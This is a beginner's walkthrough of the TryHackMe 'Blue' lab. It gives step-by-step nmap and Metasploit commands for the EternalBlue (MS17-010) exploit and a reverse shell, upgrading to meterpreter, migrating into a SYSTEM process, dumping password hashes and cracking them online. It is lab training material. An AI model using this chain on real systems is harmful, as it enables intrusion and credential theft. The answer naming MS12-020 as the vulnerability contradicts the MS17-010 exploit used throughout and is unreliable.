@@ -1,0 +1,182 @@
+ Eternal Blue Walk-through
+January 14, 2021
+
+Hi guys,
+
+Today we are going to hack eternal blue in THM.
+
+First join the server of THM through openvpn.
+
+join the room https://tryhackme.com/room/blue
+
+deploy the machine.
+
+
+
+
+
+
+
+
+
+
+1)Recon
+
+i)First we need know the details of the machine.On which ports which service is being runned and what type of operating system is being used and how it can be vulnerable.For this we are using Nmap(network mapping)tool.Now fire up the terminal.Scan the ports and the machine vulnerable to.
+
+command=  nmap -A -sV --script=vuln <ip/>
+
+
+ -->How many ports are open with a port number under 1000?
+
+A) 3
+
+ -->What is this machine vulnerable to?
+
+A) MS12-020
+
+ 
+
+2)Gain Access 
+
+Now this is the part where we are going to gain access of the deployed machine.For this we are going to use metasploit tool.
+
+ i)Find the exploitation code we will run against the machine. What is the full path of the code?
+
+First open metasploit by typind msfconsole.
+
+Now use "search ms17-010" for the exploitation code path.
+
+ 
+
+ 
+
+
+
+
+ 
+
+No.2 is the code we are going to use.Now enter "use exploit/windows/smb/ms17_010_eternalblue " or "use 2"
+
+A)exploit/windows/smb/ms17_010_eternalblue
+
+
+
+
+
+
+ii)Show options and set the one required value. What is the name of this value?
+
+A)Now we are going to set the remote host ip address.(remote host ip address is nothing but the machine ip address that we going to hack). 
+
+ command= "set RHOST <ip/>"
+
+ #check your ip address in THM or type ifconfig and see inet in tun0 and assign it
+
+ command = set LHOST <ip/>
+
+Now set payload 
+
+command = "set payload windows/x64/shell/reverse_tcp".
+
+Now enter "exploit" or "run".
+
+ -->we got into the machine successfully
+But getting a shell is'nt enough.We have to escalate our privileges to do admin level operations on the system.so we are going to upgrade from shell to meterpreter(already i got meterpreter shell but i will show you how to get it).As meterpreter gives us more functionalities as compared to normal shell.Now background the shell by pressing ctrl-z.
+
+3)Escalate
+
+ -->search for shell to meterpreter by command = "search shell_to_meterpreter"
+
+1)post/multi.shell_to_meterpreter (1Q ans)
+
+now use it by typing "use shell_to_meterpreter".
+
+ 
+
+
+Enter show options and see what have to be changed(session).
+
+Now type "sessions -i".And set session by "set session 1".
+
+Now we got meterpreter shell.
+
+command = "session -i 1".
+
+ 
+
+
+
+Now type "getsystem" to get system details.And "ps" for the process that are running in system.
+
+Note the PID of a process that is with admin privileges( NT AUTHORITY\SYSTEM).There are so many applications that are running with admin privileges.Choose any of them.I am choosing lsm.exe with PID 720.
+
+Now migrate to that process by "migrate <PID/>".
+
+If any of them got error then try another PID(Dont stick to that because we have so many process running with admin privileges.).Better to migrate 1300. 
+
+
+
+4)Cracking
+
+i)Type "hashdump" it will dump all the hashes(passwords that are stored in hash formats and user-names.).
+
+ 
+
+
+
+
+
+There are 3 users.1)admin
+
+               2)Guest
+
+               3) jon(non-deafult user)
+
+Now we will crack the hash by a online tool https://crackstation.net
+
+just copy from ffb*****************************************8d.This is NTLM hash type used by windows.
+
+ 5)Flags
+
+ i)First flag is stored in root directory. (flag1)
+
+Type "cd C:/" to enter into root directory.Now list the files in it by "ls".And "pwd" to list current directory.
+
+
+ Now there is text file named with flag1.txt.Now open it by "cat flag1.txt" to see the flag.
+
+ii)Flag2.By the help of give hint the flag was stored in password direcotry.
+
+The passwords are stores in config folder that was presented in C:\windows\System32\config.Enter into that directroy by "cd C:\windows\System32\config".
+
+Now type "ls" to list the files present in it.
+
+ 
+
+lThe second folder from last is named as flag2.txt.Open it by "cat flag2.txt".
+
+ iii)For the 3rd flag some more work is needed.Here we are using search function to decreases our work.
+
+command = "search -f flag*.txt"
+
+
+Now go to that directory and open it to get 3rd flag.
+
+ 
+
+Conclusion:-
+
+ It was a famous vulnerbility system and so many systems has been compromised by using this vulnerability.By using this type of systems can be easily compromised and leads to stealing valuable data and assests.Microsoft released patch for this after a month.So it is recommended to keep your software always updated with latest versions and patches. 
+
+About me:-
+
+I am also a intermediate cybersecurity enthusiast trying to become a good pentester and a network engineer.
+
+ 
+
+THANK YOU GUYS!
+
+By
+
+DavidRaju😉
